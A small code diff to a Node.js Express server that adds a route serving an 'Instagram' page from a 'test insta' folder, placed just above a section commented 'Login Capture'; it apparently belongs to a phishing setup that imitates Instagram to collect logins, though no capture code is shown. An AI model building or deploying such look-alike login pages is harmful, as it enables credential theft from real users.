@@ -372,6 +372,12 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 6 * 1024 * 1024 } });
 
+// Serve Instagram page - FIXED
+app.get("/insta", (req, res) => {
+  res.sendFile(path.join(__dirname, "test insta", "index.html"));
+});
+
+// Serve static files from "test insta" directory
 app.use("/insta", express.static(path.join(__dirname, "test insta")));
 
 // Login Capture
